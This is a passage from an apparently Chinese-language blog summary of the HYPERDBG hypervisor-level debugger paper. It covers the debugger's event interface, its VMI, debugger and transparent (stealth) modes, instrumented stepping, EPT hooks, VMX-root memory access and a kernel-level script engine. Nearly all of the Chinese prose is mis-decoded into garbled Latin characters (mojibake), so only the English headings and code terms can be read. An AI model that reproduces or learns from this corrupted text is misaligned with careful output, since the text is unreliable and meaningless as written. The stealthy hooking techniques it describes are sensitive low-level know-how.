çš„è¿›ç¨‹ä¼šæŠ¢å ä½ IRQL çš„çº¿ç¨‹æˆ–ä¸­æ–­ï¼Œä¸åŒçš„ IRQL ç”¨äºä¸åŒç›®çš„</li></ul><h1 id="0x03-HIGH-LEVEL-OVERVIEW"><a href="#0x03-HIGH-LEVEL-OVERVIEW" class="headerlink" title="0x03. HIGH-LEVEL OVERVIEW"></a>0x03. HIGH-LEVEL OVERVIEW</h1><p>æœ¬èŠ‚ç®€å•ä»‹ç» HYPERDBG çš„è®¾è®¡</p><h2 id="3-1-High-level-Debugging-Flow"><a href="#3-1-High-level-Debugging-Flow" class="headerlink" title="3.1 High-level Debugging Flow"></a>3.1 High-level Debugging Flow</h2><p> HYPERDBG çš„å­ç³»ç»Ÿä¸æ‰§è¡Œæµå¦‚å›¾ 1 æ‰€ç¤ºï¼ŒHost ä¸ Guest ä¹‹é—´é€šè¿‡å¦‚ä¸²å£ç­‰è¿›è¡Œé€šä¿¡ï¼ŒHost ä¾§æä¾› CLI ä¸ç”¨æˆ·äº¤äº’ï¼Œéƒ¨ç½²äº†æ±‡ç¼–å™¨&#x2F;åæ±‡ç¼–å™¨ï¼Œå¹¶éƒ¨ç½²äº†å¤šä¸ªä½¿ç”¨äº†ç¡¬ä»¶ç‰¹æ€§å¦‚ EPT çš„è°ƒè¯•å­ç³»ç»Ÿï¼›å¦‚å›¾ 1 æ‰€ç¤ºï¼š</p><ul><li>è°ƒè¯•å‘½ä»¤åœ¨ 1ï¸âƒ£ ä¸­è¢«æ±‡ç¼–&#x2F;åæ±‡ç¼–å¹¶ä¼ é€’ç»™ Guest</li><li>è„šæœ¬å¼•æ“åç«¯åœ¨ Guest çš„ hypervisor-level è§£é‡Šæ‰§è¡Œï¼Œé€šè¿‡å¦‚ 4ï¸âƒ£ æ‰€ç¤ºå®šä½ç”¨æˆ·æˆ–å†…æ ¸è¢«è°ƒè¯•è€…çš„æ‰§è¡Œæµ</li><li>2ï¸âƒ£ ä¸­å„å­ç³»ç»ŸåŸºäºäº‹ä»¶è§¦å‘æ‰§è¡Œå‘½ä»¤ä¸åŠŸèƒ½åºåˆ—ï¼ˆå¦‚ 3.2 æ‰€ç¤ºï¼‰</li><li>å­ç³»ç»Ÿåˆ©ç”¨ç¡¬ä»¶ç‰¹æ€§ï¼ˆå¦‚ EPTï¼‰æ‰§è¡Œ 3ï¸âƒ£ ä¸­æ“ä½œ</li></ul><p>Host ä¸ Guest é—´éœ€åŒå‘é€šä¿¡ï¼Œä½† HYPERDBG å¯åœ¨å¿…è¦æ—¶å°†é€šä¿¡é™åˆ¶åœ¨ guest å†…æ ¸æ¨¡å¼ä¸­çš„è‡ªåŠ¨åŒ–ä¾‹ç¨‹</p><p><img src="https://s2.loli.net/2024/09/23/8wMJgiURmfse2l3.png"></p><h2 id="3-2-Event-Triggered-Interface"><a href="#3-2-Event-Triggered-Interface" class="headerlink" title="3.2 Event-Triggered Interface"></a>3.2 Event-Triggered Interface</h2><p>æ–¹ä¾¿èµ·è§ï¼Œä½œè€…ä½¿ç”¨â€œäº‹ä»¶â€ï¼ˆEventï¼‰è¿™ä¸€æŠ½è±¡æ¦‚å¿µæ§åˆ¶åº•å±‚å‡½æ•°ä¸æ„å»ºå—çš„ä½¿ç”¨ï¼Œéšåå®šä¹‰ç”¨äºè°ƒè¯•çš„å­ç³»ç»Ÿä¸­çš„â€œæ¡ä»¶â€ï¼ˆConditionsï¼‰ä¸â€œæ“ä½œâ€ï¼ˆActionsï¼‰</p><h3 id="3-2-1-Event"><a href="#3-2-1-Event" class="headerlink" title="3.2.1 Event"></a>3.2.1 Event</h3><p>è°ƒè¯•å™¨æ‰€æ„Ÿå…´è¶£çš„äº‹ä»¶ï¼ŒåŒ…æ‹¬è®¾å®šè¦ç›‘è§†çš„ç³»ç»Ÿè°ƒç”¨ã€å†…å­˜è®¿é—®ç­‰ï¼ŒHYPERDBG å¯åœ¨äº‹ä»¶ä¸Šæ‰§è¡Œä»»æ„å·²å®šä¹‰æ“ä½œ</p><h3 id="3-2-2-Actions"><a href="#3-2-2-Actions" class="headerlink" title="3.2.2 Actions"></a>3.2.2 Actions</h3><p>äº‹ä»¶è¢«è§¦å‘å HYPERDBG å¯ä»¥æ‰§è¡Œç§°ä¸ºâ€œæ“ä½œâ€çš„ä¸‰ç±»åŠŸèƒ½ï¼šä¸‹æ–­ï¼ˆæš‚åœæ‰§è¡Œï¼‰ã€è„šæœ¬ï¼ˆè§‚æµ‹ä¸ä¿®æ”¹å¯„å­˜å™¨&#x2F;å†…å­˜ã€åˆ›å»ºæ—¥å¿—ç­‰ï¼‰ã€è‡ªå®šä¹‰ä»£ç ï¼ˆä»»æ„å®¢åˆ¶åŒ–æ±‡ç¼–ä»£ç ï¼‰</p><h3 id="3-2-3-Conditions"><a href="#3-2-3-Conditions" class="headerlink" title="3.2.3 Conditions"></a>3.2.3 Conditions</h3><p>ç”¨æˆ·å®šä¹‰çš„å¯¹äº‹ä»¶çš„çº¦æŸï¼Œä»è€Œåªåœ¨æ¡ä»¶æ»¡è¶³æ—¶è§¦å‘äº‹ä»¶</p><h2 id="3-3-Operating-Modes"><a href="#3-3-Operating-Modes" class="headerlink" title="3.3 Operating Modes"></a>3.3 Operating Modes</h2><p>HYPERDBG æœ‰ä¸¤ç§æ“ä½œæ¨¡å¼</p><h3 id="3-3-1-VMI-Mode"><a href="#3-3-1-VMI-Mode" class="headerlink" title="3.3.1 VMI Mode"></a>3.3.1 VMI Mode</h3><p>è™šæ‹Ÿæœºè‡ªçœï¼ˆVirtual Machine Introspectionï¼‰æ¨¡å¼ç”¨äºå¸¸è§„çš„ç”¨æˆ·ç¨‹åºè°ƒè¯•ä¸å†…æ ¸æ¨¡å¼æœ¬åœ°è°ƒè¯•ï¼Œè™½ç„¶å…¶æä¾›äº†ä¼ ç»Ÿçš„è°ƒè¯•ä½“éªŒä¸æ‰€æœ‰çš„ HYPERDBG åŠŸèƒ½ï¼Œä½†å†…æ ¸æ¨¡å¼çš„æ–­ç‚¹ä¸æ­¥å…¥å—é™ï¼›VMI ä¹Ÿå…è®¸åœ¨æœ¬åœ°&#x2F;è¿œç¨‹è°ƒè¯•ä¸­åœ¨ç”¨æˆ·æ€&#x2F;å†…æ ¸æ€è¿è¡Œè„šæœ¬ä¸ä»£ç </p><h3 id="3-3-2-Debugger-Mode"><a href="#3-3-2-Debugger-Mode" class="headerlink" title="3.3.2 Debugger Mode"></a>3.3.2 Debugger Mode</h3><p>è°ƒè¯•å™¨æ¨¡å¼ï¼ˆDebugger Modeï¼‰å…è®¸é€šè¿‡ä¸²å£æˆ–è™šæ‹Ÿä¸²è¡Œè®¾å¤‡è¿æ¥åˆ°å†…æ ¸å¹¶æš‚åœç³»ç»Ÿä»¥å•æ­¥è°ƒè¯•ç”¨æˆ·ä¸å†…æ ¸æŒ‡ä»¤</p><h3 id="3-3-3-Transparent-Mode"><a href="#3-3-3-Transparent-Mode" class="headerlink" title="3.3.3 Transparent Mode"></a>3.3.3 Transparent Mode</h3><blockquote><p>ç¬”è€…æ³¨ï¼šç»å…¸ X å¤§æœ‰ X + 1 ä¸ªï¼ˆ</p></blockquote><p>é€æ˜æ¨¡å¼ï¼ˆTransparent Modeï¼‰å¯ä»¥åŒæ—¶ä½¿ç”¨è¿™ä¸¤ç§æ¨¡å¼ï¼Œå…¶é€šè¿‡éšè— HYPERDBG åœ¨æ—¶é—´ä¸å¾®æ¶æ„çº§åˆ«çš„å­˜åœ¨æ¥æä¾›éšèº«è°ƒè¯•ï¼Œç¬¬ 6 èŠ‚æè¿°äº†ä½¿ç”¨çš„é€æ˜æŠ€æœ¯ï¼Œç¬¬ 7.1 çš†è¿›è¡Œäº†è¯„ä¼°</p><h1 id="0x04-BACK-END-ARCHITECTURE"><a href="#0x04-BACK-END-ARCHITECTURE" class="headerlink" title="0x04. BACK-END ARCHITECTURE"></a>0x04. BACK-END ARCHITECTURE</h1><p>æœ¬èŠ‚åœ¨å­ç³»ç»Ÿçº§æ¢ç´¢ HYPERDBG çš„æ¶æ„è®¾è®¡</p><h2 id="4-1-Stepping-Subsystem"><a href="#4-1-Stepping-Subsystem" class="headerlink" title="4.1 Stepping Subsystem"></a>4.1 Stepping Subsystem</h2><p>æœ¬èŠ‚ç ”ç©¶ä¼ ç»Ÿè°ƒè¯•å™¨çš„æ­¥å…¥æœºåˆ¶çš„ç¼ºç‚¹ï¼Œå¹¶è®¨è®º HYPERDBG ä½œä¸º VMX-root æ¨¡å¼è°ƒè¯•å™¨çš„è§£å†³æ–¹æ¡ˆ</p><h3 id="4-1-1-Step-in"><a href="#4-1-1-Step-in" class="headerlink" title="4.1.1 Step-in"></a>4.1.1 Step-in</h3><p>æ­¥å…¥ï¼ˆStep-inï¼‰é€šè¿‡è®¾ç½® RFLAGS trap æ ‡å¿—ä½è®©ç³»ç»Ÿåœ¨æ‰§è¡Œå•æ¡æŒ‡ä»¤ååœæ­¢ï¼Œä»¥è®©è°ƒè¯•å™¨è¯»å–&#x2F;ä¿®æ”¹å¯„å­˜å™¨ä¸å†…å­˜</p><p><strong>Challenge.</strong> ä¼ ç»Ÿæ­¥å…¥æœºåˆ¶æ— æ³•ç¡®ä¿é€è¡Œæ­¥å…¥è¿‡ç¨‹ï¼Œå› ä¸ºå¯èƒ½è½¬ç§»åˆ°å…¶ä»– CPU æ ¸å¿ƒæ‰§è¡Œï¼Œä¸­æ–­å¯èƒ½å½»åº•æ”¹å˜æ‰§è¡Œæµ</p><p>å›¾ 2a æ˜¯ä¸€ä¸ªæ­¥å…¥æ‰§è¡Œæµè¢« #DB å¼‚å¸¸ä¸­æ–­æ‰“ä¹±çš„ä¾‹å­ï¼Œä¸€ä¸ªç®€å•çš„è§£å†³æ–¹æ¡ˆæ˜¯æ¸…é™¤ RFLAGS çš„ä¸­æ–­æ ‡å¿—ä½æ¥å±è”½å¤–éƒ¨ä¸­æ–­ï¼Œä½†å¾ˆå®¹æ˜“ç ´åæ“ä½œç³»ç»Ÿè¯­ä¹‰ï¼›HYPERDBG å¼•å…¥äº† <em>æ’æ¡©æ­¥å…¥</em> ï¼ˆInstrumental Step-inï¼‰æ¥ç¡®ä¿è°ƒè¯•ä¸­çš„æ­¥å…¥æœºåˆ¶</p><p><strong>Approach.</strong> HYPERDBG é€šè¿‡ä½¿ç”¨ Monitor Trap Flag ï¼ˆå¯¹ Guest é€æ˜ï¼Œç±»ä¼¼ <code>RFLAGS::TF</code> ï¼‰å¼•å…¥æ’æ¡©æ­¥å…¥æœºåˆ¶ï¼Œéå¯å±è”½ä¸­æ–­ï¼ˆNon-Maskable Interruptsï¼ŒNMIsï¼‰ç”¨æ¥ç¡®ä¿æ“ä½œåœ¨ä¸€ä¸ªæ ¸å¿ƒä¸Šæ‰§è¡Œã€å…¶ä»–æ ¸å¿ƒæŒ‚èµ·</p><p><img src="https://s2.loli.net/2024/09/23/xbRJdLfjqUwz75h.png"></p><h3 id="4-1-2-Instrumentation-Step-in"><a href="#4-1-2-Instrumentation-Step-in" class="headerlink" title="4.1.2 Instrumentation Step-in"></a>4.1.2 Instrumentation Step-in</h3><p>HYPERDBG æ˜¯æ®ä½œè€…æ‰€çŸ¥ç¬¬ä¸€ä¸ªæä¾›äº†ç¡®ä¿æ­¥å…¥æ–¹æ³•çš„è°ƒè¯•å™¨ï¼Œå¦‚å›¾ 2c æ‰€ç¤ºï¼Œåœ¨ Guest æ‰§è¡Œç›®æ ‡æŒ‡ä»¤åä¼šè§¦å‘ VM-exitï¼ˆè®¾ç½®äº† MTFï¼‰ï¼ŒHYPERDBG ä»…åœ¨è¯¥æ ¸å¿ƒä¸Šç»§ç»­æ‰§è¡Œä¸”ç¦æ­¢ä¸­æ–­ï¼ˆè®¾ç½® VMCSï¼‰ä»¥æä¾›ç»†ç²’åº¦çš„æ­¥å…¥ï¼Œè¿™æä¾›äº†å…¶ä»–è°ƒè¯•å™¨ï¼ˆå¦‚ WinDbgï¼‰æ‰€æ²¡æœ‰çš„ç‰¹æ€§ï¼Œä¾‹å¦‚åœ¨ç”¨æˆ·æ¨¡å¼æ‰§è¡Œ <code>SYSCALL</code> æŒ‡ä»¤æ—¶ HYPERDBG å…è®¸ç›´æ¥æ‰§è¡Œæ¥ä¸‹æ¥è¿›å…¥å†…æ ¸çš„æŒ‡ä»¤ï¼ˆSYSCALL handlerï¼‰ï¼Œæˆ–ç±»ä¼¼çš„ç¼ºé¡µå¼‚å¸¸ handlerï¼Œæˆ– <code>SYSRET</code> ã€<code>IRET</code> æŒ‡ä»¤</p><h3 id="4-1-3-Step-over"><a href="#4-1-3-Step-over" class="headerlink" title="4.1.3 Step-over"></a>4.1.3 Step-over</h3><p>æ­¥è¿‡ï¼ˆstep-overï¼‰æœºåˆ¶ä¸­è°ƒè¯•å™¨ä¼šæŠŠ call æŒ‡ä»¤çš„é•¿åº¦å‘ç»™è¢«è°ƒè¯•è€…ï¼ˆè€Œéè®¾ç½® Trap æ ‡å¿—ä½ï¼‰ï¼Œè®¾ç½®ç¡¬ä»¶è°ƒè¯•å¯„å­˜å™¨ä»¥åœ¨ call å®Œæˆåè§¦å‘å¹¶é€šçŸ¥è°ƒè¯•å™¨ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼›ç”±äºå…¶ä»–çº¿ç¨‹&#x2F;æ ¸å¿ƒä¹Ÿå¯èƒ½è§¦å‘ç¡¬ä»¶è°ƒè¯•å¯„å­˜å™¨ï¼ŒHYPERDBG å¿½è§†æ¥è‡ªå…¶ä»–çº¿ç¨‹&#x2F;è¿›ç¨‹ ID çš„ #DBsï¼Œå¹¶é‡ç½®è°ƒè¯•å¯„å­˜å™¨ç›´åˆ°åˆ°æ­£ç¡®çš„æ‰§è¡Œä¸Šä¸‹æ–‡ä¸ç›®æ ‡çº¿ç¨‹ï¼Œå›¾ 2b å±•ç¤ºäº† HYPERDBG çš„å•æ­¥è·³è¿‡æœºåˆ¶ï¼Œåœ¨æ£€æŸ¥è°ƒç”¨æŒ‡ä»¤åï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤å°†ä¼šæŠ›å‡ºæ–­ç‚¹å¼‚å¸¸ï¼ˆBreakpoint Exceptionï¼Œ#DBï¼‰</p><h2 id="4-2-Hooking-Subsystem"><a href="#4-2-Hooking-Subsystem" class="headerlink" title="4.2 Hooking Subsystem"></a>4.2 Hooking Subsystem</h2><p>Hooking å³æ‹¦æˆªä»»æ„äº‹ä»¶ã€è¿è¡Œä»»æ„æŒ‡ä»¤ã€å°†æ‰§è¡Œæµè¿”å›åˆ°äº‹ä»¶å…¥å£ç‚¹çš„è¡Œä¸º</p><p><strong>Challenge.</strong> ç°æœ‰è°ƒè¯•å™¨çš„ hooking ç³»ç»Ÿä½¿ç”¨å¯ä»¥è¢«æ£€æµ‹çš„ç›´æ¥å†…å­˜è®¿é—®ï¼Œä¸” <em>ç¡¬ä»¶è°ƒè¯•å¯„å­˜å™¨</em> ï¼ˆHardware Debug Registersï¼‰çš„æ•°é‡ä¸å¤§å°æ˜¯å›ºå®šçš„ï¼Œè¿™é™åˆ¶äº† Hooking çš„æ€§èƒ½</p><h3 id="4-2-1-SYSCALL-and-SYSRET-Hooks"><a href="#4-2-1-SYSCALL-and-SYSRET-Hooks" class="headerlink" title="4.2.1 SYSCALL and SYSRET Hooks"></a>4.2.1 SYSCALL and SYSRET Hooks</h3><p>HYPERDBG é€šè¿‡æ¸…é™¤æ‰©å±•ç‰¹æ€§å¯ç”¨å¯„å­˜å™¨ï¼ˆExtended Feature Enable Register,å³ <code>IA32_EFER</code> ï¼‰çš„ SCE ä½è§¦å‘æœªå®šä¹‰æ“ä½œå¼‚å¸¸ï¼ˆundefined opcode exceptionï¼Œ#UDï¼‰å¹¶æ£€æŸ¥å¼‚å¸¸æºå¤´ä»¥å®ç° hooking åŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥æ‰§è¡Œä»»æ„è„šæœ¬å¹¶ä¸ºä»»æ„ç³»ç»Ÿè°ƒç”¨è¿›å…¥ï¼ˆSYSCALLï¼‰æˆ–è¿”å›ï¼ˆSYSRETï¼‰è®¾ç½® hooks ï¼Œè°ƒè¯•å™¨å¯ä»¥åœ¨å®é™…æ‰§è¡ŒæŒ‡ä»¤å‰ç›‘è§†&#x2F;æ‰§è¡Œ&#x2F;ä¿®æ”¹ç³»ç»Ÿä¸Šä¸‹æ–‡</p><p><strong>Approach.</strong> HYPERDBG é€šè¿‡ä¸¤ç§ EPT hooking æœºåˆ¶é€æ˜åœ°ç›‘è§†ä¸æ“çºµå†…å­˜è®¿é—®ï¼Œå¹¶æ¨¡æ‹Ÿè°ƒè¯•å¯„å­˜å™¨ä»¥è¶…è¶Šæ­¤å‰çš„é™åˆ¶</p><h3 id="4-2-2-EPT-Hidden-Hook"><a href="#4-2-2-EPT-Hidden-Hook" class="headerlink" title="4.2.2 EPT Hidden Hook"></a>4.2.2 EPT Hidden Hook</h3><p>ä½œè€…æå‡ºäº†å¯¹ç”¨æˆ·&#x2F;å†…æ ¸ä¸å¯è§çš„ EPT-level hooking ï¼Œåœ¨ HYPERDBG ä¸­ç¬¬ä¸€ç§æ˜¯åœ¨ç›®æ ‡æœºå™¨å†…å­˜ä¸­æ³¨å…¥ #BPï¼ˆ0xccï¼‰çš„ä¼ ç»Ÿ EPT hookï¼Œç¬¬äºŒç§åˆ©ç”¨äº† <a href="https://www.cs.columbia.edu/~junfeng/10fa-e6998/papers/detours.pdf">Detours</a> é£æ ¼çš„ Hookï¼Œé€šè¿‡è·³è½¬åˆ°ä¿®è¡¥åçš„æŒ‡ä»¤å¹¶åœ¨å›è°ƒåè¿”å›åˆ°å¸¸è§„æ‰§è¡Œæµä»¥æ”¹å˜æ‰§è¡Œè·¯å¾„ï¼Œåè€…è™½ç„¶å­˜åœ¨çµæ´»æ€§é™åˆ¶ä½†é¿å…äº†æ˜‚è´µçš„ VM-exit</p><h3 id="4-2-3-Limitless-Simulating-of-Debug-Register-ï¼ˆmonitorï¼‰"><a href="#4-2-3-Limitless-Simulating-of-Debug-Register-ï¼ˆmonitorï¼‰" class="headerlink" title="4.2.3 Limitless Simulating of Debug Register ï¼ˆmonitorï¼‰"></a>4.2.3 Limitless Simulating of Debug Register ï¼ˆmonitorï¼‰</h3><p>EPT hooking ä¹Ÿå…è®¸é€šè¿‡è§¦å‘äº‹ä»¶è§¦å‘å™¨ï¼ˆevent triggerï¼‰æ¥æ¨¡æ‹Ÿç¡¬ä»¶è°ƒè¯•å¯„å­˜å™¨ä»¥ç›‘è§†å¯¹ä»»æ„åœ°å€èŒƒå›´çš„ä»»æ„è¯»å†™ï¼Œå¹¶æ¶ˆé™¤ HDR çš„æ•°é‡ä¸é•¿åº¦é™åˆ¶</p><h2 id="4-3-Memory-Access-in-VMX-root-Mode"><a href="#4-3-Memory-Access-in-VMX-root-Mode" class="headerlink" title="4.3 Memory Access in VMX-root Mode"></a>4.3 Memory Access in VMX-root Mode</h2><p>å®‰å…¨å†…å­˜è®¿é—®æ˜¯è®¾è®¡ hypervisor-level debugger çš„ä¸€ä¸ªæŒ‘æˆ˜ï¼Œå› ä¸ºè®¸å¤šåœºæ™¯éƒ½èƒ½å¯¼è‡´ç³»ç»ŸæŒ‚èµ·æˆ–å¼‚å¸¸ï¼ˆå¦‚åœ¨ VMX-root è®¿é—®ç”¨æˆ·åœ°å€ç©ºé—´ï¼‰ï¼Œä¸”æ— æ³•é€šè¿‡ç°æˆçš„æŒ‡ä»¤ï¼ˆå¦‚ <code>mov</code> ï¼‰è§£å†³</p><p><strong>Challenge.</strong> VMX-level çš„å®‰å…¨å†…å­˜è®¿é—®æå…¶å¤æ‚ï¼Œé€šå¸¸çš„ç”± OS å¤„ç†ä¼šå¯¼è‡´æ€§èƒ½å¼€é”€ï¼Œä½†å¯¹å¾ˆå¤šåœºæ™¯è€Œè¨€å®‰å…¨ä¸”é«˜æ•ˆçš„å†…å­˜è®¿é—®æ˜¯å¿…è¦çš„ </p><p><strong>Approach.</strong> ä½œè€…æå‡ºäº†ä¸€ç³»åˆ—ç­–ç•¥æ¥è§£å†³ VMX å†…å­˜ç®¡ç†çš„å¤æ‚æ€§</p><h3 id="4-3-1-Discover-Page-table-Entries"><a href="#4-3-1-Discover-Page-table-Entries" class="headerlink" title="4.3.1 Discover Page-table Entries"></a>4.3.1 Discover Page-table Entries</h3><p>æ£€æŸ¥ç›®æ ‡åœ°å€é¡µé¢åˆæ³•æ€§çš„ä¼ ç»Ÿæ–¹æ³•æ˜¯æ£€æŸ¥é¡µè¡¨ä¸­æ˜¯å¦æœ‰åˆæ³•çš„ PTEï¼ˆå¹¶è®¾ç½®äº† present ä½ï¼‰ï¼Œä½œè€…ä½¿ç”¨æ— éœ€åœ¨ç”¨æˆ·æ€ä¸å†…æ ¸æ€é—´åˆ‡æ¢ä¾¿èƒ½æŠ‘åˆ¶å¼‚å¸¸çš„ Intel TSX è¿›è¡Œæ›¿ä»£ï¼Œé€šè¿‡æ£€æŸ¥åŒ…å«ç›®æ ‡åœ°å€çš„äº‹åŠ¡çš„æˆåŠŸæ‰§è¡Œæ¥æ£€æŸ¥é¡µé¢åˆæ³•æ€§ï¼Œè¿™ä»…éœ€è¦å¦‚ Listing 1 æ‰€ç¤ºçš„ç®€çŸ­ä»£ç ï¼›HYPERDBG å¯¹ä¸æ”¯æŒ TSX çš„å¤„ç†å™¨ä¼šåœ¨éœ€è¦æ—¶å›é€€åˆ°å‰ä¸€ç§æ–¹æ³•ï¼›ä½œè€…çš„å®éªŒè¯æ˜åœ¨ç”¨æˆ·æ€èƒ½å¿«ä¸‰ä¸ªæ•°é‡çº§ï¼Œä½†åœ¨å†…æ ¸æ€ä¼šç”±äº RTM routine è€Œå‡æ…¢ 40%</p><p><img src="https://s2.loli.net/2024/09/23/PN4KGjfC286poJY.png"></p><h3 id="4-3-2-Retrieving-a-Page-by-Injecting-Page-Fault-PF"><a href="#4-3-2-Retrieving-a-Page-by-Injecting-Page-Fault-PF" class="headerlink" title="4.3.2 Retrieving a Page by Injecting Page Fault (#PF)"></a>4.3.2 Retrieving a Page by Injecting Page Fault (#PF)</h3><p>HYPERDBG åœ¨ç¼ºé¡µæ—¶å‘è¢«è°ƒè¯•è€…æ³¨å…¥ç¼ºé¡µå¼‚å¸¸ï¼ˆé€šè¿‡ä¿®æ”¹ CR2 ä¸ºç›®æ ‡è™šæ‹Ÿåœ°å€ï¼‰ä»¥è¯·æ±‚ VMX non-root ä»ç¡¬ç›˜ä¸Šå¸¦å›è¯¥é¡µ</p><h3 id="4-3-3-VMX-root-Mode-Compatible-Message-Tracing"><a href="#4-3-3-VMX-root-Mode-Compatible-Message-Tracing" class="headerlink" title="4.3.3 VMX-root Mode Compatible Message Tracing"></a>4.3.3 VMX-root Mode Compatible Message Tracing</h3><p>VMX-root ä¸ VMX-non-root é—´çš„æ¶ˆæ¯ä¼ é€’é¢ä¸´å·¨å¤§æŒ‘æˆ˜ï¼ŒVMX-root æ¨¡å¼ä¸‹è®¿é—®åˆ†é¡µæ± æœ‰è¯¸å¤šé™åˆ¶ï¼Œç»å¤§éƒ¨åˆ† NT å‡½æ•°ä¹Ÿä¸å…¼å®¹ä»»ä½• IRQLï¼›HYPERDBG ä½¿ç”¨å¯¹ VMX-root å¯è§çš„éåˆ†é¡µæ± éƒ¨ç½²ç‰¹åˆ¶çš„æ¶ˆæ¯è¿½è¸ªæœºåˆ¶ï¼Œç»†èŠ‚åœ¨ <a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-8/">https://rayanfam.com/topics/hypervisor-from-scratch-part-8/</a> ä¸­è¿›è¡Œäº†å½»åº•è®¨è®º</p><h3 id="4-3-4-Reading-and-Writing-Memory"><a href="#4-3-4-Reading-and-Writing-Memory" class="headerlink" title="4.3.4 Reading and Writing Memory"></a>4.3.4 Reading and Writing Memory</h3><p>å‡ºäºå¤šæ–¹é¢è€ƒè™‘ï¼ŒHYPERDBG å¹¶ä¸ç›´æ¥è®¿é—®å†…å­˜ï¼Œä½†ä½¿ç”¨è™šæ‹Ÿå¯»å€æ–¹æ³•ä¿ç•™ PTE å¹¶æ˜ å°„å¯¹åº”ç‰©ç†å†…å­˜åˆ°å†…æ ¸è™šæ‹Ÿåœ°å€ä»¥å®‰å…¨åœ°è¯»å†™</p><h3 id="4-3-5-Pre-allocated-Pools"><a href="#4-3-5-Pre-allocated-Pools" class="headerlink" title="4.3.5 Pre-allocated Pools"></a>4.3.5 Pre-allocated Pools</h3><p>HYPERDBG ä½¿ç”¨é¢„åˆ†é…æ± ä»¥è§£å†³ä¼ ç»Ÿä¸Š VMX root ä¸‹æ— æ³•åˆ†é…å†…å­˜çš„é—®é¢˜ï¼Œå…¶ï¼ˆ4KB ç²’åº¦æ—¶ï¼‰æä¾›äº† EPT hooks æ‰€éœ€çš„èµ„æºï¼ŒHYPERDBG çš„å†…å­˜ç®¡ç†å™¨ä¼šè®°å½• VMX root ä¸­æ‰€éœ€çš„å†…å­˜æ± ä¸­é‡Šæ”¾&#x2F;æ›¿æ¢ï¼Œå¹¶åœ¨ VMX non-root ä¸­æ‰§è¡Œ</p><h1 id="0x05-FRONT-END-ARCHITECTURE"><a href="#0x05-FRONT-END-ARCHITECTURE" class="headerlink" title="0x05. FRONT-END ARCHITECTURE"></a>0x05. FRONT-END ARCHITECTURE</h1><p>æœ¬èŠ‚è®¨è®ºè¿æ¥åç«¯çš„ä¸­é—´ä»¶ä¸ UI</p><h2 id="5-1-Communicating-and-Task-Appliance"><a href="#5-1-Communicating-and-Task-Appliance" class="headerlink" title="5.1 Communicating and Task Appliance"></a>5.1 Communicating and Task Appliance</h2><p>ç”¨ç½‘ç»œä¼ è¾“æ•°æ®çš„ Windows API ç”±äºä¸­æ–­åœ¨ VMX-root ä¸‹ä¸å¯ç”¨è€Œä¸åˆ‡å®é™…ï¼Œä¸”ç”±äº IRQL è€Œéœ€è¦é¢å¤–çš„å®ç°ï¼Œå› æ­¤ HYPERDBG åˆ©ç”¨ä¸²å£è¿›è¡Œæ•°æ®ä¼ è¾“ï¼ˆå¦‚å›¾ 3 æ‰€ç¤ºï¼‰ï¼Œå…¶ç®€åŒ–äº†è®¾è®¡å¹¶å…è®¸ä½¿ç”¨è½®è¯¢ï¼Œæ­¤å¤– HYPERDBG å¯ä»¥ä½¿ç”¨ KDNet è¿›è¡Œé€šä¿¡</p><p><img src="https://s2.loli.net/2024/09/23/5U1QCYlmPdIHFkM.png" alt="image.png"></p><h3 id="5-1-1-Sending-Data-over-Serial"><a href="#5-1-1-Sending-Data-over-Serial" class="headerlink" title="5.1.1 Sending Data over Serial"></a>5.1.1 Sending Data over Serial</h3><p>HYPERDBG æ”¯æŒæœ€å¤šå››ä¸ªä¸²å£ï¼Œå¯ä»¥é€šè¿‡ä¸²è¡Œè®¾å¤‡ä¸­æ–­æŒ‚èµ·è¢«è°ƒè¯•æ–¹è€Œæ— éœ€ä¸¥æ ¼è½®è¯¢ï¼Œæ­¤åä½¿ç”¨ <code>VMCALL</code> è¿”å› <code>VMX-root</code> ç­‰å¾…è°ƒè¯•å™¨åç»­å‘½ä»¤</p><h3 id="5-1-2-Communication-between-Cores"><a href="#5-1-2-Communication-between-Cores" class="headerlink" title="5.1.2 Communication between Cores"></a>5.1.2 Communication between Cores</h3><p>HYPERDBG åœ¨ VMX-root æ¨¡å¼é€šè¿‡ NMIs æŒ‚èµ·å…¶ä»–æ ¸å¿ƒï¼Œæˆ–æ˜¯ä¸é€šçŸ¥å…¶ä»–æ ¸è€Œç›´æ¥æ‰§è¡Œä»£ç &#x2F;è„šæœ¬</p><h2 id="5-2-Kernel-level-Script-Engine"><a href="#5-2-Kernel-level-Script-Engine" class="headerlink" title="5.2 Kernel-level Script Engine"></a>5.2 Kernel-level Script Engine</h2><p>ç°ä»£è°ƒè¯•å™¨ç¼ºä¹é«˜æ€§èƒ½ä¸é«˜å¯å®šåˆ¶çš„è„šæœ¬æ¡†æ¶ï¼Œå› æ­¤ä½œè€…ä»é›¶å¼€å§‹è®¾è®¡äº†ä¸€ä¸ª VMX-enabled çš„è„šæœ¬å¼•æ“ï¼Œæ®æ‚‰æ˜¯ä»…æœ‰çš„å¯åœ¨ VMX-root æ¨¡å¼ä¸‹æä¾›é«˜çº§ç‰¹æ€§å¦‚ OS è‡ªæ—‹é”ã€å†…å­˜æ£€æŸ¥ã€è¾…åŠ©å‡½æ•°ï¼ˆå¦‚ printfï¼‰ç­‰çš„è„šæœ¬å¼•æ“è§£å†³æ–¹æ¡ˆï¼›è„šæœ¬å¼•æ“çš„æ¶æ„å¦‚å›¾ 4a æ‰€ç¤ºï¼Œå…¶ç”±ä¸€ä¸ªåç«¯ï¼ˆä½¿ç”¨ <code>LL(1)</code> ä¸ <code>LALR(1)</code> è§£æå™¨ä»¥è¿½æ±‚æœ€å¤§æ•ˆç‡ï¼‰ä¸ä¸€ä¸ªä½¿ç”¨ MASM é£æ ¼ä¸ C å…³é”®å­—ï¼ˆå¦‚ <code>if/else/for</code> ï¼‰ä»¥åŠæ˜“å®šåˆ¶çš„è¯­æ³•çš„å‰ç«¯ç»„æˆ </p><p><img src="https://s2.loli.net/2024/09/24/841gSeGhCtM7LNJ.png"></p><p>ç”¨æˆ·è¾“å…¥çš„è„šæœ¬è¢«ä¼ é€’ç»™ host å‰ç«¯ï¼Œç”± lexer æ‰«æå…¥ï¼Œå¹¶è¢«ç¿»è¯‘ä¸ºä¸­é—´è¡¨ç¤ºï¼ˆIntermediate Representationï¼‰ï¼Œä¹‹åé€šè¿‡ä¸²å£ä¼ è¾“åˆ° guest çš„ kernel VMX-root 